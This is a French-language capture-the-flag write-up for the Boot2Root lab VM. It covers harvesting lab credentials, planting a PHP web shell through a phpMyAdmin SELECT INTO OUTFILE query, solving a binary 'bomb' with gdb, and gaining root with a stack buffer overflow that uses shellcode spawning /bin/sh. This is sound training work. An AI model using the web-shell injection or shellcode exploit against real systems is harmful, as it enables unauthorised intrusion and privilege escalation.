# Write Up 1

## Password
| Service    | User                 | Passwd                                                             |
|------------|----------------------|--------------------------------------------------------------------|
| serv       | user                 | `pass`                                                             | 
| Forum      | lmezard              | `!q\]Ej?*5K5cy*AJ`                                                 | 
| Mail       | laurie@borntosec.net | `!q\]Ej?*5K5cy*AJ`                                                 | 
| PhpMyAdmin | root                 | `Fg-'kKXBj87E:aJ$`                                                 | 
| FTP        | lmezard              | `G!@M6f4Eatau{sF"`                                                 | 
| SSH        | laurie               | `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4` | 
| SSH        | thor                 | `Publicspeakingisveryeasy.126241207201b2149opekmq426135`           | 
| SSH        | zaz                  | `646da671ca01bb5d84dbb5fb2238dc8e`                                 | 

## Forum
- Nous recuperons les [logs du ssh](https://192.168.1.96/forum/index.php?id=6) sur le forum 
- `python3 ssh_parse.py`
<pre>
{'test', 'support', 'naos', 'lmezard', 'guest', 'nagios', 'ubnt', 'root', <strong>'!q\\]Ej?*5K5cy*AJ'</strong>, 'ftpuser', 'PlcmSpIp', 'adm', 'user', 'adam', 'nvdb', 'admin', 'pi'}
</pre>
- On se connecte avec les login `lmezard` et `!q\]Ej?*5K5cy*AJ`
- Le mail est disponible dans les parametres de l'user

## Mail
- On se connecte au server imap avec `laurie@borntosec.net` et `!q\]Ej?*5K5cy*AJ` avec evolution ou sur le site [webmail](https://borntosec.net/webmail/)
- Un mail est disponible
<pre>
Hey Laurie,

You cant connect to the databases now. Use <strong>root/Fg-'kKXBj87E:aJ$</strong>

Best regards.
</pre>

## PhpMyAdmin
- Nous pouvons donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
- En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
- On essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
- En executant cette commande sql je peux ecrire dans un fichier.
```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
```
- En regardant le forum type sur [github](https://github.com/ilosuna/mylittleforum) et en testant tout les dossier un est accessible a l'ecriture `/var/www/forum/templates_c`
- Dans les home un dossier est presant LOOKATME qui contient un dossier password
```
lmezard:G!@M6f4Eatau{sF"
```

## Lmezard FTP
- On peut se connecter au FTP grace a ces login
- On recupere les fichiers
- README:
```
Complete this little challenge and use the result as password for user 'laurie' to login in ssh
```
- On remarque que le fichier fun est une archive de plusieurs fichiers, on le decompresse donc avec `tar -xf fun`
```
$> file fun 
fun: POSIX tar archive (GNU)
```
- On remarque que le contenu des fichiers est un code en C en plusieurs partie
- Nous avons donc cr???? un script python qui recup??re tout les fichiers et les mets dans l'ordre.

```
$> python fun.py "../Ressources/ft_fun" > fun.c
$> gcc fun.c 
$> ./a.out 
MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit% 
```

- On se connecte maintenant en SSH avec laurie en login et **330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4** en mot de passe.

```
ssh laurie@192.168.1.97
```

## Laurie

- Un fichier README se trouve dans le home de laurie: 
```
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
```
- Un fichier bomb est aussi present.
- Nous le decompilons avec binary ninja et commencons ?? le resoudre

### Phase 1:
- Nous pouvons report?? la string depuis binary ninja: `Public speaking is very easy.`

### Phase 2:
- Avec binary ninja on sait que le premier chiffre est 1
- Pour les suivant on utilise gdb
- On break a la comparaison et on print $eax se qui nous donne le nouveau chiffre
<pre>
$> gdb ./bomb 
gdb-peda$ b *0x8048b7e
Breakpoint 1 at 0x8048b7e
gdb-peda$ r
Starting program: /home/alarm/Boot2Root/scripts/bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 15 15 15 15 15
gdb-peda$ x $eax
0x2:    Cannot access memory at address 0x2
</pre>

### Phase 3 
- Dans binary ninja on voit qu'il y a trois argument "%d %c %d"
- Dans le code il suffit de lire les condition
- Le premier chiffre determine les deux argument d'apres dans les case
- Pour 0
```
case 0
		ebx.b = 0x71 // le char
		if (var_8 !=  0x309) // le int de fin
				explode_bomb()
				noreturn;
```

### Phase 4
- LE SCRIPTTTT !

### Phase 5
- On set un breakpoint au call de la fonction strings_not_equal et de regarder la correscpondance de chaque lettre avec l'autre
<pre>
gdb-peda$ disass phase_5
Dump of assembler code for function phase_5:
   0x08048d7a <+78>:    push   eax
   0x08048d7b <+79>:    call   0x8049030 <strings_not_equal>
   0x08048d80 <+84>:    add    esp,0x10
gdb-peda$ b *0x08048d7b
Breakpoint 1 at 0x8048d7b
gdb-peda$ r bite
Starting program: /home/alarm/Boot2Root/scripts/bomb bite
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Phase 1 defused. How about the next one?
That's number 2.  Keep going!
Halfway there!
So you got that one.  Try this one.
[----------------------------------registers-----------------------------------]
EAX: 0xffffd590 ("srveaw")
EBX: 0x804b7c0 ("abcdef")
ECX: 0xffffd590 ("srveaw")
[-------------------------------------code-------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048d7b in phase_5 ()
</pre>
- Ce qui donne:

| g | i | a | n | t | s |
|:-:|:-:|:-:|:-:|:-:|:-:|
| o | p | e | k | m | q |

### Phase 6
- On sait grace au code qu'il ne faut que:
  - Les chiffres ne soit pas en double
  - Les chiffre doivent etre entre 0 et 6
  - que le premier est egale a 4
- avec ces informations on a test?? cr??e un script qui teste les 775 possibilit??s
- Ce qui donne:
```
4 2 6 3 1 5
```

### Secret Phase
- On peut rentrer dans la secret a condition qu'une string soit egale a "austinpowers"
- Quand on regarde la string qui est sscanf elle est egale a "9"
- On comprend donc que c'est la string de phase 4 qui est analys?? on rajoute donc " austinpowers" a la fin

### Password
- Le tout donne:
```
Public speaking is very easy.
1 2 6 24 120 720
1 b 214
9
opekmq
4 2 6 3 1 5
```
- Ce qui donne en inversant les dernier caracteres:
```
Publicspeakingisveryeasy.126241207201b2149opekmq426135
```

## Turtle
- Il y a un fichier avec des instructions
- En l'interpretant avec un script javascript, on voit que les instructions ecrivent: SLASH
- En le convertissant en md5 nous opettenons le mot de passe de zaz
- Ce qui donne:
```
646da671ca01bb5d84dbb5fb2238dc8e
```

## Zaz & Root
- On voit qu'il y a un strcpy de argv[1], le programme peut donc ??tre overflow
```
$> ltrace ./exploit_me testt
__libc_start_main(0x80483f4, 2, 0xbffff704, 0x8048440, 0x80484b0 <unfinished ...>
strcpy(0xbffff5e0, "testt")                                            = 0xbffff5e0
puts("testt"testt)                                                     = 6
+++ exited (status 0) +++
```
- On calcule l'offset
<pre>
zaz@BornToSecHackMe:~$ gdb ./exploit_me 
(gdb) source /tmp/peda/peda.py 
gdb-peda$ pattern arg 200
Set 1 arguments to program
gdb-peda$ r
[----------------------------------registers-----------------------------------]
EBP: 0x41514141 ('AAQA')
ESP: 0xbffff5a0 ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41416d41 ('AmAA')
EFLAGS: 0x210286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41416d41
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41416d41 in ?? ()
gdb-peda$ pattern offset AmAA
AmAA found at offset: 140
</pre>
- Ce qui donne
```
./exploit_me $(python -c "import struct; print('\x90' * (100) + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * (140 - 121) + struct.pack('<I', 0xbffff560))")
```
